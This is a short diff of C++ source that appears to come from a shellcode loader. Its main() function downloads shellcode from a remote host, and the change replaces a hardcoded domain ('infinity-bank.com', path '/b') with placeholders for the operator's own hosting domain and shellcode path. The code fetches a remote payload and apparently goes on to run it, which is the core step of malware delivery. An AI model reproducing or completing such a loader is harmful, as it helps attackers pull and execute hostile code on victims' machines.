@@ -12,7 +12,7 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 int main()
 {
     // Download Shellcode
-    std::vector<BYTE> shellcode = Download(L"infinity-bank.com", L"/b\0");
+    std::vector<BYTE> shellcode = Download(L"YOUR-HOSTING-DOMAIN", L"URI-PATH-TO-HOSTED-SHELLCODE\0");
 
     if (shellcode.empty()) {
         std::cerr << "[x] Failed to download shellcode." << std::endl;
